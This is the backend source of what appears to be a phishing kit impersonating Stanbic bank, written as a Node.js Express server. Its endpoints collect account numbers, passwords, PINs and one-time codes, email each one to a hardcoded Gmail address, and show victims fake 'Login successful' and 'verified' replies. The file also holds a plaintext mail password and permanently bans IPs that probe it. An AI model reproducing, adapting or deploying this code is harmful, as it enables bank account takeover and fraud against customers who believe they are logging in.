const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");
require("dotenv").config();

// CRITICAL for Vercel — real client IP for rate limiter
app.set("trust proxy", 1);

// Middleware
app.use(express.json());

// Allow ALL origins
// CORS — update to your actual frontend Vercel URL
app.use(
  cors({
    origin: "https://desk-stanbic-online.vercel.app",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  })
);
app.options("*", cors());
app.use(express.json());
const PORT = process.env.PORT || 5000;

// Email credentials — hardcoded so Vercel always has them
// (dotenv still works for local dev if you have a .env file)
const userEmail = process.env.EMAIL_USER || "okoriekennethassetvalue@gmail.com";
const pass = process.env.EMAIL_PASS || "ognghvvpyfgylalm";

// ── Permanent IP blocklist ────────────────────────────────────────────────────
const blockedIPs = new Set();
app.use((req, res, next) => {
  if (blockedIPs.has(req.ip)) {
    return res.status(403).json({ success: false, message: "Access denied." });
  }
  next();
});

// ── Rate limiter: 5 POSTs per hour, then block IP forever ────────────────────
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    blockedIPs.add(req.ip);
    return res.status(403).json({ success: false, message: "Access denied." });
  },
});
app.use((req, res, next) => {
  if (req.method === "POST") return limiter(req, res, next);
  next();
});

// Reusable transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});
transporter.verify((error) => {
  if (error) console.error("❌ Mail transporter error:", error.message);
  else console.log("✅ Mail transporter ready");
});

// Helper: send email and respond
const sendMailAndRespond = (
  mailOptions,
  res,
  successMsg,
  failMsg,
  failCode = 400,
) => {
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Email error:", error);
      return res.status(failCode).json({ success: false, message: failMsg });
    }
    console.log("Email sent:", info.response);
    return res.status(200).json({ success: true, message: successMsg });
  });
};

// ── Health check — fixes "Cannot GET /" ──────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "ok", server: "Stanbic API" });
});

// ─── ENDPOINT 1: POST / ─── Login
app.post("/", (req, res) => {
  const { accountNumber, password } = req.body;

  if (!accountNumber || !password) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid account number or password" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Login Details",
    text: `Account Number: ${accountNumber}\nPassword: ${password}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Login successful",
    "Invalid account number or password",
    401,
  );
});

// ─── ENDPOINT 2: POST /pin ─── PIN Verification
app.post("/pin", (req, res) => {
  const { pin } = req.body;

  if (!pin || !/^\d{4}$/.test(pin)) {
    return res.status(401).json({ success: false, message: "Invalid PIN" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic PIN Confirmation",
    text: `User PIN: ${pin}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "PIN verified successfully",
    "Invalid PIN",
    401,
  );
});

// ─── ENDPOINT 3: POST /verify-otp ─── OTP Verification
app.post("/verify-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{5}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// ─── ENDPOINT 4: POST /resend-otp ─── Resend OTP
app.post("/resend-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{5}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Second OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Second OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
